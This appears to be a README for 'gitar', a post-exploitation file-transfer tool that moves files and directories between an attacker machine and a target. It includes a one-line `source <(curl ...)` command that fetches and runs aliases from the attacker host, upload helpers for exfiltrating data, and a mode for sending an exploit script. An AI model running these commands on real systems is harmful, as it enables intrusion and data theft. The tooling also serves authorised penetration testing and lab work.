|**~>** Have the  ***simplest possible shortcuts*** to upload/download file to/from the target machine<br>**~>** ***No installation needed*** on target machine<br>**~>** ***Fast and simple*** deployment|



## TL;DR *- and listen music*

On my target machine:
 - **Download a file** from my attacker machine: `pull [file]` *(with filename completion)*
 - **Download a directory** from my attacker machine: `pullr [directory]` *(with filename completion)*
 - **Upload a file** to my attacker machine: `push [file]`
 - **Upload a directory** to my attacker machine: `pushr [directory]`

*Before be able to use these shortcut you have to [set up](#set-up) both machines. Once again, the aim is to made it as simple as possible*

## Set up


### üé∏ Launch `gitar` server 
 
On **Attacker machine**: 
```shell
gitar
```

On **Target machine**:

```shell
# Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. 
# It is also provided by step 1. (in gitar output):
source <(curl -s http://[attacker_ip:port]/alias)
```

**And that's all, you can now `push` or `pull` file [üé∂](#tldr---and-listen-music)**

### üêã Secure launch of `gitar` server

This is basicaly the same as launching `gitar` server. But as we expose our http server we become the prey. Hence we must harden a bit the server. To do this we launch `gitar` inside a container and use HTTPS.

The following steps expose files of current directory. Files uploaded by remote are written inside current directory also.

On **Attacker machine**: 
```shell
docker run -it --rm --net host --cap-drop=all --cap-add=dac_override --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" ariary/gitar
```

**You can now `push`or `pull` file being more safe [üé∂](#tldr---and-listen-music)**

### Pre-requisites

* HTTP Network connectivity between attacker & target machines
* On target machine: `curl` 
	* `tar` for directory upload 
* On attacker machine: 
	* `xclip` to copy command on clipboard (not required)
	* `tree`: to expose it trough server (not required)
	* `dig`: to automatically find extarnal IP (not required)

The aim is to keep "target requirements" as fit as possible. Attacker machine requirements are not a big deal as we have plenty control over it and time to configure it.

## Additional Functionalities

### `send` mode

Use this mode to quickly send a file to a target machine using different method/protocol. The advantage is that you do not have to remember the command line (if required field is not specified with flags it will be asked in a prompt).

It also has a kind of memory. with the `-l` flag it will use the previous configuration to send the file.
```shell
# send /img folder using scp with user root to target.com
gitar send scp -t target.com -u root /img
# now send exploit.sh to the same hsot
gitar send -l exploit.sh
```

### `webhook` mode

Use this mode if you want to have some logs about incoming HTTP requests. It enables us to:
* Log request information
	* request parameter values
	* request header values
        * request body 
* Override response
	* header 
* Forward request to another http server (~ local logging middleware)
* Serve directory
```shell
# log incoming request and retrieve payload parameter value
gitar webhook -P payload
```
## Install

go install github.com/ariary/gitar@latest
